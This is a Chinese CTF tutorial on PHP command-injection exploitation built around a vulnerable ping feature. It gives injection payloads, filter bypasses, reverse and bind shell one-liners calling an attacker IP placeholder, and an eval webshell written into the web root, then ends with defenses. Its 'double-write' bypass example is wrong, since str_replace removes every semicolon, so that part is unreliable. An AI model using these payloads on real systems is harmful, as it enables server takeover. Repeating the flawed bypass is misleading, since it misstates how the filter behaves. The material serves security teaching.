# CTF教程：P60：命令执行利用

![](img/769c547290e962451c06062c86fdcebc_1.png)

![](img/769c547290e962451c06062c86fdcebc_3.png)

![](img/769c547290e962451c06062c86fdcebc_5.png)

![](img/769c547290e962451c06062c86fdcebc_7.png)

![](img/769c547290e962451c06062c86fdcebc_9.png)

![](img/769c547290e962451c06062c86fdcebc_11.png)

![](img/769c547290e962451c06062c86fdcebc_12.png)

## 概述
在本节课中，我们将学习命令执行漏洞的利用方法。上节课我们介绍了命令执行漏洞的基本原理和危险函数，本节我们将深入探讨如何利用这些漏洞，并了解相应的防护措施。

![](img/769c547290e962451c06062c86fdcebc_14.png)

![](img/769c547290e962451c06062c86fdcebc_16.png)

![](img/769c547290e962451c06062c86fdcebc_18.png)

![](img/769c547290e962451c06062c86fdcebc_20.png)

![](img/769c547290e962451c06062c86fdcebc_22.png)

![](img/769c547290e962451c06062c86fdcebc_24.png)

![](img/769c547290e962451c06062c86fdcebc_26.png)

![](img/769c547290e962451c06062c86fdcebc_28.png)

![](img/769c547290e962451c06062c86fdcebc_30.png)

![](img/769c547290e962451c06062c86fdcebc_32.png)

![](img/769c547290e962451c06062c86fdcebc_34.png)

![](img/769c547290e962451c06062c86fdcebc_36.png)

![](img/769c547290e962451c06062c86fdcebc_38.png)

![](img/769c547290e962451c06062c86fdcebc_40.png)

![](img/769c547290e962451c06062c86fdcebc_42.png)

![](img/769c547290e962451c06062c86fdcebc_43.png)

![](img/769c547290e962451c06062c86fdcebc_45.png)

## 上节回顾
上一节我们介绍了命令执行漏洞产生的原因、危害以及PHP中可能导致代码执行和系统命令执行的关键函数。本节中我们来看看如何在实际场景中利用这些漏洞。

![](img/769c547290e962451c06062c86fdcebc_47.png)

![](img/769c547290e962451c06062c86fdcebc_49.png)

![](img/769c547290e962451c06062c86fdcebc_51.png)

![](img/769c547290e962451c06062c86fdcebc_53.png)

![](img/769c547290e962451c06062c86fdcebc_55.png)

![](img/769c547290e962451c06062c86fdcebc_57.png)

![](img/769c547290e962451c06062c86fdcebc_59.png)

![](img/769c547290e962451c06062c86fdcebc_61.png)

![](img/769c547290e962451c06062c86fdcebc_63.png)

![](img/769c547290e962451c06062c86fdcebc_65.png)

## 命令执行漏洞利用演示

![](img/769c547290e962451c06062c86fdcebc_67.png)

![](img/769c547290e962451c06062c86fdcebc_69.png)

以下是利用特殊字符拼接命令的几种常见方法。我们将通过一个存在漏洞的“Ping测试”功能点进行演示。

![](img/769c547290e962451c06062c86fdcebc_71.png)

![](img/769c547290e962451c06062c86fdcebc_73.png)

![](img/769c547290e962451c06062c86fdcebc_75.png)

![](img/769c547290e962451c06062c86fdcebc_77.png)

该功能点的核心代码如下，它接收用户输入的IP地址并直接拼接到系统命令中执行，未做任何过滤：
```php
$ip = $_POST['ip'];
system("ping -c 3 " . $ip);
```

![](img/769c547290e962451c06062c86fdcebc_79.png)

![](img/769c547290e962451c06062c86fdcebc_81.png)

![](img/769c547290e962451c06062c86fdcebc_83.png)

![](img/769c547290e962451c06062c86fdcebc_85.png)

![](img/769c547290e962451c06062c86fdcebc_87.png)

![](img/769c547290e962451c06062c86fdcebc_89.png)

![](img/769c547290e962451c06062c86fdcebc_91.png)

![](img/769c547290e962451c06062c86fdcebc_93.png)

![](img/769c547290e962451c06062c86fdcebc_94.png)

![](img/769c547290e962451c06062c86fdcebc_96.png)

![](img/769c547290e962451c06062c86fdcebc_97.png)

![](img/769c547290e962451c06062c86fdcebc_99.png)

### 利用管道符 `|`
管道符 `|` 会将前一个命令的输出作为后一个命令的输入。无论前一个命令是否执行成功，后一个命令都会执行。
*   **Payload示例**：`127.0.0.1 | whoami`
*   **实际执行的命令**：`ping -c 3 127.0.0.1 | whoami`
*   **效果**：先执行`ping`命令，然后执行`whoami`命令并返回当前系统用户（如`apache`）。

![](img/769c547290e962451c06062c86fdcebc_101.png)

![](img/769c547290e962451c06062c86fdcebc_103.png)

![](img/769c547290e962451c06062c86fdcebc_104.png)

![](img/769c547290e962451c06062c86fdcebc_105.png)

![](img/769c547290e962451c06062c86fdcebc_107.png)

![](img/769c547290e962451c06062c86fdcebc_109.png)

![](img/769c547290e962451c06062c86fdcebc_111.png)

![](img/769c547290e962451c06062c86fdcebc_113.png)

![](img/769c547290e962451c06062c86fdcebc_115.png)

![](img/769c547290e962451c06062c86fdcebc_117.png)

![](img/769c547290e962451c06062c86fdcebc_119.png)

![](img/769c547290e962451c06062c86fdcebc_121.png)

### 利用分号 `;`
分号 `;` 用于顺序执行多条命令。
*   **Payload示例**：`127.0.0.1; whoami`
*   **实际执行的命令**：`ping -c 3 127.0.0.1; whoami`
*   **效果**：先执行`ping`命令，然后执行`whoami`命令。

![](img/769c547290e962451c06062c86fdcebc_123.png)

![](img/769c547290e962451c06062c86fdcebc_125.png)

![](img/769c547290e962451c06062c86fdcebc_127.png)

![](img/769c547290e962451c06062c86fdcebc_129.png)

![](img/769c547290e962451c06062c86fdcebc_131.png)

![](img/769c547290e962451c06062c86fdcebc_133.png)

![](img/769c547290e962451c06062c86fdcebc_135.png)

![](img/769c547290e962451c06062c86fdcebc_137.png)

![](img/769c547290e962451c06062c86fdcebc_139.png)

### 利用逻辑与 `&&`
逻辑与 `&&` 表示只有前一个命令执行成功（返回值为0），才会执行后一个命令。
*   **Payload示例**：`127.0.0.1 && whoami`
*   **实际执行的命令**：`ping -c 3 127.0.0.1 && whoami`
*   **效果**：`ping`命令成功后，执行`whoami`命令。

![](img/769c547290e962451c06062c86fdcebc_141.png)

![](img/769c547290e962451c06062c86fdcebc_143.png)

![](img/769c547290e962451c06062c86fdcebc_145.png)

![](img/769c547290e962451c06062c86fdcebc_147.png)

![](img/769c547290e962451c06062c86fdcebc_149.png)

![](img/769c547290e962451c06062c86fdcebc_151.png)

![](img/769c547290e962451c06062c86fdcebc_153.png)

![](img/769c547290e962451c06062c86fdcebc_155.png)

![](img/769c547290e962451c06062c86fdcebc_157.png)

### 利用逻辑或 `||`
逻辑或 `||` 表示只有前一个命令执行失败（返回值非0），才会执行后一个命令。
*   **Payload示例**：`invalidip || whoami`
*   **实际执行的命令**：`ping -c 3 invalidip || whoami`
*   **效果**：`ping`一个无效IP失败后，执行`whoami`命令。

![](img/769c547290e962451c06062c86fdcebc_159.png)

![](img/769c547290e962451c06062c86fdcebc_161.png)

![](img/769c547290e962451c06062c86fdcebc_163.png)

![](img/769c547290e962451c06062c86fdcebc_165.png)

![](img/769c547290e962451c06062c86fdcebc_167.png)

![](img/769c547290e962451c06062c86fdcebc_169.png)

### 利用反引号 `` ` ``
反引号中的内容会被当作系统命令执行，并将其输出结果替换到原位置。
*   **Payload示例**：`127.0.0.1 `whoami``
*   **实际执行的命令**：`ping -c 3 apache` （假设`whoami`输出`apache`）
*   **效果**：先执行`whoami`得到用户名`apache`，然后拼接成命令`ping -c 3 apache`执行。

![](img/769c547290e962451c06062c86fdcebc_171.png)

![](img/769c547290e962451c06062c86fdcebc_173.png)

![](img/769c547290e962451c06062c86fdcebc_175.png)

![](img/769c547290e962451c06062c86fdcebc_177.png)

![](img/769c547290e962451c06062c86fdcebc_179.png)

![](img/769c547290e962451c06062c86fdcebc_181.png)

## 绕过简单的黑名单过滤
有时应用程序会尝试过滤某些特殊字符。以下是一个简单的黑名单过滤示例代码：
```php
$blacklist = array('|', ';', '&');
$ip = str_replace($blacklist, '', $_POST['ip']);
system("ping -c 3 " . $ip);
```

![](img/769c547290e962451c06062c86fdcebc_183.png)

![](img/769c547290e962451c06062c86fdcebc_185.png)

![](img/769c547290e962451c06062c86fdcebc_187.png)

![](img/769c547290e962451c06062c86fdcebc_189.png)

### 双写绕过
如果过滤方式是简单替换为空，可以通过双写关键字来绕过。
*   **Payload示例**：`127.0.0.1; ;whoami`
*   **过滤后**：中间的`;`被移除，剩下的字符组合成`127.0.0.1; whoami`，成功注入。

![](img/769c547290e962451c06062c86fdcebc_191.png)

![](img/769c547290e962451c06062c86fdcebc_193.png)

![](img/769c547290e962451c06062c86fdcebc_195.png)

### 使用未过滤的字符
如果黑名单不全，可以尝试使用其他未被过滤的命令连接符，如`%0a`（换行符）、`%0d`（回车符）。
*   **Payload示例**：`127.0.0.1%0awhoami`
*   **效果**：URL解码后，`%0a`作为换行符，能成功分割命令。

![](img/769c547290e962451c06062c86fdcebc_197.png)

![](img/769c547290e962451c06062c86fdcebc_199.png)

![](img/769c547290e962451c06062c86fdcebc_200.png)

![](img/769c547290e962451c06062c86fdcebc_202.png)

![](img/769c547290e962451c06062c86fdcebc_204.png)

![](img/769c547290e962451c06062c86fdcebc_206.png)

## 高级利用：获取Shell
一旦能够执行系统命令，攻击者通常会尝试获取一个交互式的Shell（命令行权限）。

![](img/769c547290e962451c06062c86fdcebc_208.png)

![](img/769c547290e962451c06062c86fdcebc_210.png)

![](img/769c547290e962451c06062c86fdcebc_212.png)

![](img/769c547290e962451c06062c86fdcebc_214.png)

![](img/769c547290e962451c06062c86fdcebc_216.png)

![](img/769c547290e962451c06062c86fdcebc_218.png)

![](img/769c547290e962451c06062c86fdcebc_219.png)

### 反向Shell（Reverse Shell）
让目标服务器主动连接攻击者控制的机器。
1.  **攻击机监听端口**：在攻击机上执行 `nc -lvp 4444`，监听4444端口。
2.  **目标机执行连接命令**：通过漏洞在目标服务器上执行以下命令（根据系统选择）：
    *   **Linux**：`bash -i >& /dev/tcp/攻击机IP/4444 0>&1`
    *   **使用nc**：`nc 攻击机IP 4444 -e /bin/bash`
3.  **效果**：目标机连接到攻击机，攻击机获得目标机的Shell。

![](img/769c547290e962451c06062c86fdcebc_221.png)

![](img/769c547290e962451c06062c86fdcebc_223.png)

![](img/769c547290e962451c06062c86fdcebc_225.png)

![](img/769c547290e962451c06062c86fdcebc_227.png)

![](img/769c547290e962451c06062c86fdcebc_229.png)

![](img/769c547290e962451c06062c86fdcebc_230.png)

![](img/769c547290e962451c06062c86fdcebc_232.png)

![](img/769c547290e962451c06062c86fdcebc_234.png)

![](img/769c547290e962451c06062c86fdcebc_236.png)

![](img/769c547290e962451c06062c86fdcebc_238.png)

### 正向Shell（Bind Shell）
在目标服务器上打开一个端口，等待攻击者连接。
1.  **目标机监听端口**：通过漏洞在目标服务器上执行 `nc -lvp 5555 -e /bin/bash`。
2.  **攻击机进行连接**：攻击机执行 `nc 目标机IP 5555`。
3.  **效果**：攻击机连接到目标机开放的端口，获得Shell。

![](img/769c547290e962451c06062c86fdcebc_239.png)

![](img/769c547290e962451c06062c86fdcebc_241.png)

![](img/769c547290e962451c06062c86fdcebc_242.png)

![](img/769c547290e962451c06062c86fdcebc_244.png)

![](img/769c547290e962451c06062c86fdcebc_246.png)

![](img/769c547290e962451c06062c86fdcebc_248.png)

![](img/769c547290e962451c06062c86fdcebc_250.png)

![](img/769c547290e962451c06062c86fdcebc_252.png)

![](img/769c547290e962451c06062c86fdcebc_254.png)

![](img/769c547290e962451c06062c86fdcebc_256.png)

![](img/769c547290e962451c06062c86fdcebc_258.png)

### 写入WebShell
如果Web目录有写权限，可以直接写入一个PHP Webshell文件。
*   **Payload示例**：`; echo '<?php @eval($_POST[cmd]);?>' > /var/www/html/shell.php`
*   **效果**：在Web目录下生成`shell.php`文件，攻击者可通过中国菜刀等工具连接。

![](img/769c547290e962451c06062c86fdcebc_260.png)

![](img/769c547290e962451c06062c86fdcebc_262.png)

![](img/769c547290e962451c06062c86fdcebc_264.png)

![](img/769c547290e962451c06062c86fdcebc_266.png)

![](img/769c547290e962451c06062c86fdcebc_268.png)

![](img/769c547290e962451c06062c86fdcebc_270.png)

![](img/769c547290e962451c06062c86fdcebc_272.png)

![](img/769c547290e962451c06062c86fdcebc_274.png)

## 命令执行漏洞防护
了解了利用方式后，我们来看看如何防护命令执行漏洞。

![](img/769c547290e962451c06062c86fdcebc_276.png)

### 1. 禁用高危函数
在PHP配置文件（php.ini）中，通过`disable_functions`选项禁用不必要的危险函数。
```
disable_functions = system, exec, shell_exec, passthru, proc_open, popen, eval, assert, ...
```

### 2. 严格过滤输入
对用户输入进行严格的验证和过滤，采用白名单策略是最佳实践。
*   **示例（Ping功能）**：只允许输入符合IP格式（如：`192.168.1.1`）的字符串。
    ```php
    function isValidIP($ip) {
        $parts = explode('.', $ip);
        if (count($parts) != 4) return false;
        foreach ($parts as $part) {
            if (!is_numeric($part) || $part < 0 || $part > 255) {
                return false;
            }
        }
        return true;
    }
    if (isValidIP($_POST['ip'])) {
        system("ping -c 3 " . escapeshellarg($_POST['ip']));
    } else {
        die('Invalid IP address.');
    }
    ```
*   **使用转义函数**：如果必须使用用户输入拼接命令，务必使用`escapeshellarg()`或`escapeshellcmd()`函数进行转义。

### 3. 使用安全模式（已弃用，了解即可）
旧版PHP的`safe_mode`选项可以限制文件操作和命令执行，但在PHP 5.4.0后被移除。现代应用不应依赖此模式。

![](img/769c547290e962451c06062c86fdcebc_278.png)

## 总结
本节课我们一起学习了命令执行漏洞的多种利用方式，包括使用特殊字符绕过、获取反向/正向Shell以及写入WebShell。同时，我们也探讨了如何通过禁用高危函数、严格输入验证和使用转义函数来有效防护此类高危漏洞。理解攻击手法是构建有效防御的基础，希望同学们能通过实践加深理解。